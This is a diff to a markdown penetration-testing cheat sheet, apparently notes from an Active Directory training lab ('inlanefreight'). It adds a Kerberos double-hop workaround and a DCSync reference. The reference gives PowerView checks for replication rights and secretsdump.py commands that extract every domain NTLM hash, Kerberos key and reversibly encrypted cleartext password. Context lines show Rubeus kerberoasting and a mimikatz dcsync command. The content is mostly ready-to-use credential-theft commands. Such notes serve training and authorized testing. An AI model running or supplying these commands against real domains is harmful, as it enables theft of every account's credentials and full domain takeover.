@@ -2439,6 +2439,23 @@ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
 .\Rubeus.exe kerberoast /usetgtdeleg
 ```
 
+
+>[!warning] kerberos double hop issue fix
+```
+# 1. Register a persistent, custom session configuration endpoint bound to the target credentials
+Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+
+# 2. Cycle the Windows Remote Management service to parse the newly registered configuration endpoint
+Restart-Service WinRM
+
+# 3. Establish a new PSSession utilizing the explicitly named configuration flag
+Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
+
+# Verification: Checking 'klist' inside this session confirms valid cached tickets are present to query the DC
+Get-DomainUser -spn | select samaccountname
+```
+>
+
 > [!warning] 💾 Windows CMD: Requesting Service Ticket Extraction Arrays natively from Connected Memory Loops
 > 
 > Uses Rubeus within a local Windows session to extract roastable TGS ticket hashes for all accessible domain service accounts.
@@ -2896,6 +2913,72 @@ Get-LAPSComputers
 > lsadump::dcsync /all /domain:corp.local      # Extracts all hashes from the domain
 > ```
 
+
+
+>[!check] DCSyn Attack 
+```
+# Active Directory DCSync Attack: Complete Reference Guide
+
+
+
+---
+
+## 1. Core Mechanics of DCSync
+
+The **DCSync** attack leverages legitimate Active Directory replication features to extract password hashes filelessly over the network. 
+
+* **The Protocol:** It utilizes the **MS-DRSR (Directory Replication Service Remote Protocol)**, which Domain Controllers use to synchronize domain databases.
+* **The Technique:** Instead of cracking the database offline or dumping process memory locally, an attacker impersonates a Domain Controller and requests account updates. The targeted Domain Controller then transmits the requested NTLM hashes or Kerberos keys directly over the network wire.
+
+---
+
+## 2. Active Directory Rights Verification (Windows / PowerShell)
+
+Before executing the attack, you must verify that the compromised user account possesses replication permissions over the domain root node. This is audited using the **PowerView** module.
+
+```powershell
+# Step 1: Query target user account properties to extract the specific Object SID
+Get-DomainUser -Identity adunn | select samaccountname, objectsid, memberof, useraccountcontrol | fl
+
+# Step 2: Store the retrieved Security Identifier (SID) into a local variable
+$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
+
+# Step 3: Check the root domain Access Control List (ACL) for explicit replication permissions
+# This filters for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights mapping flags
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
+
+# Step 4: Scan the domain for accounts configured with Reversible Encryption Enabled
+# Method A: Using standard Active Directory PowerShell Cmdlet directly
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+
+# Method B: Using PowerView to filter by the ENCRYPTED_TEXT_PWD_ALLOWED string match
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname, useraccountcontrol
+
+
+
+#linux 
+# Execute a full domain database extraction using the compromised account credentials
+# This outputs NTLM hashes, Kerberos keys, and cleartext passwords into files prefixed with 'inlanefreight_hashes'
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+
+# Advanced Command Variations:
+
+# Variation A: Extract NTLM hashes exclusively (skips processing Kerberos authentication keys)
+secretsdump.py -outputfile inlanefreight_ntlm_only -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5
+
+# Variation B: Target a single specific high-value user account to minimize network footprint noise
+secretsdump.py -outputfile targeted_user_hash -just-dc-user Administrator INLANEFREIGHT/adunn@172.16.5.5
+
+# Variation C: Pull complete domain password history loops for offline cracking strength metrics
+secretsdump.py -outputfile domain_history -just-dc -history INLANEFREIGHT/adunn@172.16.5.5
+
+# Variation D: Append administrative account status metadata (disabled flags, password last set dates)
+secretsdump.py -outputfile domain_triage -just-dc -pwd-last-set -user-status INLANEFREIGHT/adunn@172.16.5.5
+
+# Step 2: Read decrypted cleartext values leaked via Reversible Encryption accounts
+cat inlanefreight_hashes.ntds.cleartext
+
+```
 ### ACL Abuse — Common Paths from BloodHound
 
 >[!check] ACL Abuse
